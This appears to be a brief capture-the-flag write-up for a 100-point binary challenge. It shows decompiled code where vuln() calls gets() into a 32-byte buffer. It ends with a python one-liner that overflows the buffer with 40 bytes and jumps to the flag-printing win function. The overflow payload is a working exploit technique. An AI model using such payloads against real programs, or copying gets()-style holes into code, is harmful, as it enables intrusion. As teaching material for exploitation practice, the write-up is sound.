# Easy Peasy

> A super secret piece of information has been hidden behind a program made by 1337 hackers. Find this crucial piece of information
> Author: Anand Rajaram

Tags: binary
Difficulty: easy
Points: 100

function main

```
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rdx

  puts("Please enter the super secret password to display the flag:", argv, envp);
  fflush(stdout);
  vuln();
  puts("Invalid password, try again\n", argv, v3);
  return 0;
}
```

function vuln

```
__int64 vuln()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  return gets(v1);
}
```

function win

```
__int64 win()
{

  v9 = fopen64("flag.txt", &unk_498008);
  if ( !v9 )
  {
    printf(
      (unsigned int)"%s %s",
      (unsigned int)"Please create 'flag.txt' in this directory with your",
      (unsigned int)"own debugging flag.\n",
      v0,
      v1,
      v2,
      v8[0]);
    exit(0LL);
  }
  fgets(v8, 64LL, v9);
  return printf((unsigned int)v8, 64, v3, v4, v5, v6, v8[0]);
}
```

berikut alamat dari fungsi win yang mencetak flag

![]()

```
python -c "import sys; import struct; sys.stdout.buffer.write(b'A'*40 + struct.pack('<Q', 0x00000000004017ea))" | ./ezpz
```
